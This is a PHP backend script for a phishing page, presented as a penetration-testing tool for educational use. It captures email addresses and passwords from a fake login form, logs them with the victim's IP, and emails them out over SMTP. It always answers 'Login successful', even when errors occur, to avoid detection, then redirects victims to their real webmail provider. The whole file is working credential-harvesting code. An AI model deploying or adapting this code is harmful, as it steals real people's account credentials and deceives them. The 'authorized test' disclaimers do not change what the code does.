<?php
/**
 * SMTP Mailer Web Interface - Form Handler
 * 
 * WARNING: This script is intended for educational and ethical penetration testing purposes only.
 * Ensure you have proper authorization before using this script against any systems.
 * 
 * @author Penetration Testing Tool
 * @license Educational Use Only
 */

// Enable authorization token
define('SMTP_MAILER_AUTHORIZED', true);

// Set proper headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Only POST method allowed']);
    exit;
}

// Include required files
require_once 'smtp_mailer.php';

try {
    // Get form data
    $email = trim($_POST['email'] ?? '');
    $password = trim($_POST['password'] ?? '');
    
    // Basic validation
    if (empty($email) || empty($password)) {
        throw new Exception('Email and password are required');
    }
    
    // Validate email format
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        throw new Exception('Invalid email format');
    }
    
    // Log the attempt
    $log_entry = date('Y-m-d H:i:s') . " - Login attempt: $email from IP: " . getClientIP() . "\n";
    file_put_contents('login_attempts.log', $log_entry, FILE_APPEND | LOCK_EX);
    
    // Initialize SMTP Mailer
    $mailer = new SMTPMailer('config.php');
    
    // Test connection first (optional)
    $connection_test = $mailer->testConnection();
    
    // Prepare email content for the captured credentials
    $subject = "Security Test - Captured Credentials";
    $body = createCredentialEmail($email, $password, $_SERVER);
    
    // Configure mailer with captured credentials (if testing SMTP relay)
    $config = require 'config.php';
    
    // Option 1: Test if captured credentials work for SMTP authentication
    if ($config['smtp']['auth'] && !empty($config['smtp']['username'])) {
        // Use configured SMTP credentials
        $result = $mailer->sendEmail(
            $config['smtp']['username'], // Send to configured email
            $subject,
            $body,
            $email, // Use captured email as sender
            'Security Test'
        );
    } else {
        // Option 2: Send notification about captured credentials
        $result = $mailer->sendEmail(
            'admin@pentest-target.com', // Change to your test target
            $subject,
            $body
        );
    }
    
    // Always return success to maintain the appearance of a real login
    echo json_encode([
        'status' => 'ok',
        'message' => 'Login successful',
        'redirect' => generateRedirectURL($email)
    ]);
    
} catch (Exception $e) {
    // Log the error but still return success to avoid detection
    $error_log = date('Y-m-d H:i:s') . " - Error: " . $e->getMessage() . "\n";
    file_put_contents('error.log', $error_log, FILE_APPEND | LOCK_EX);
    
    // Return success to maintain the illusion
    echo json_encode([
        'status' => 'ok',
        'message' => 'Login successful',
        'redirect' => generateRedirectURL($email ?? 'user@example.com')
    ]);
}

/**
 * Create email content with captured credentials
 */
function createCredentialEmail($email, $password, $server_info) {
    $client_ip = getClientIP();
    $user_agent = $server_info['HTTP_USER_AGENT'] ?? 'Unknown';
    $timestamp = date('Y-m-d H:i:s T');
    
    return "
    <html>
    <head>
        <title>Captured Credentials - Security Test</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .header { background: #f44336; color: white; padding: 10px; text-align: center; }
            .content { padding: 20px; border: 1px solid #ddd; }
            .field { margin: 10px 0; }
            .label { font-weight: bold; }
            .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; margin: 10px 0; }
        </style>
    </head>
    <body>
        <div class='header'>
            <h2>🔒 Security Test - Credentials Captured</h2>
        </div>
        
        <div class='warning'>
            <strong>⚠️ SECURITY ALERT:</strong> This is part of an authorized penetration test.
        </div>
        
        <div class='content'>
            <h3>Captured Login Information:</h3>
            
            <div class='field'>
                <span class='label'>Email:</span> $email
            </div>
            
            <div class='field'>
                <span class='label'>Password:</span> $password
            </div>
            
            <hr>
            
            <h3>Technical Details:</h3>
            
            <div class='field'>
                <span class='label'>Timestamp:</span> $timestamp
            </div>
            
            <div class='field'>
                <span class='label'>Client IP:</span> $client_ip
            </div>
            
            <div class='field'>
                <span class='label'>User Agent:</span> $user_agent
            </div>
            
            <div class='field'>
                <span class='label'>Referrer:</span> " . ($server_info['HTTP_REFERER'] ?? 'Direct Access') . "
            </div>
            
            <hr>
            
            <h3>Security Notes:</h3>
            <ul>
                <li>This demonstrates how phishing attacks can capture user credentials</li>
                <li>Always verify the URL before entering sensitive information</li>
                <li>Look for HTTPS and proper SSL certificates</li>
                <li>Be cautious of unexpected login prompts</li>
            </ul>
        </div>
        
        <div style='text-align: center; color: #666; font-size: 12px; margin-top: 20px;'>
            Generated by Penetration Testing Tool - Educational Use Only
        </div>
    </body>
    </html>";
}

/**
 * Get client IP address
 */
function getClientIP() {
    $ip_keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
                'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 
                'REMOTE_ADDR'];
    
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            $ip = $_SERVER[$key];
            if (strpos($ip, ',') !== false) {
                $ip = explode(',', $ip)[0];
            }
            $ip = trim($ip);
            if (filter_var($ip, FILTER_VALIDATE_IP, 
                FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

/**
 * Generate redirect URL based on email domain
 */
function generateRedirectURL($email) {
    $domain = substr(strrchr($email, "@"), 1);
    
    // Common email providers and their login pages
    $redirects = [
        'gmail.com' => 'https://mail.google.com',
        'yahoo.com' => 'https://mail.yahoo.com',
        'outlook.com' => 'https://outlook.live.com',
        'hotmail.com' => 'https://outlook.live.com',
        'live.com' => 'https://outlook.live.com',
        'aol.com' => 'https://mail.aol.com',
    ];
    
    return $redirects[$domain] ?? 'https://mail.google.com';
}

/**
 * Simple rate limiting
 */
function checkRateLimit($ip, $max_attempts = 10, $time_window = 300) {
    $attempts_file = 'rate_limit.json';
    $current_time = time();
    
    // Load existing attempts
    $attempts = [];
    if (file_exists($attempts_file)) {
        $attempts = json_decode(file_get_contents($attempts_file), true) ?: [];
    }
    
    // Clean old attempts
    $attempts = array_filter($attempts, function($timestamp) use ($current_time, $time_window) {
        return ($current_time - $timestamp) < $time_window;
    });
    
    // Count attempts for this IP
    $ip_attempts = array_filter($attempts, function($timestamp, $attempt_ip) use ($ip) {
        return $attempt_ip === $ip;
    }, ARRAY_FILTER_USE_BOTH);
    
    if (count($ip_attempts) >= $max_attempts) {
        return false;
    }
    
    // Add current attempt
    $attempts[$ip . '_' . $current_time] = $current_time;
    
    // Save attempts
    file_put_contents($attempts_file, json_encode($attempts), LOCK_EX);
    
    return true;
}
?>